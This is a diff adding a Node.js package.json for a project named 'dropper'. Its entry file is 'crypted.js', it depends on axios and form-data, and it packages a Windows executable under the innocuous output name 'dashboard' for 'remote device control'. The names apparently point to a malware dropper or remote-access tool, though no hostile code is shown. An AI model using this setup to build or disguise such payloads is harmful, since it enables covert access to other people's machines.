@@ -1,0 +1,21 @@
+{
+    "name": "dropper",
+    "version": "1.0.0",
+    "description": "A Node.js project for remote device control and monitoring.",
+    "main": "crypted.js",
+    "bin": "crypted.js",
+     "dependencies": {
+        "axios": "^1.7.7",
+        "form-data": "^4.0.0"
+    },
+    "pkg": {
+        "targets": [
+            "node18-win-x64"
+        ],
+        "output": "build/dashboard",
+        "assets": [
+            "node_modules/axios/dist/node/axios.cjs"
+        ]
+    },
+    "license": "ISC"
+}
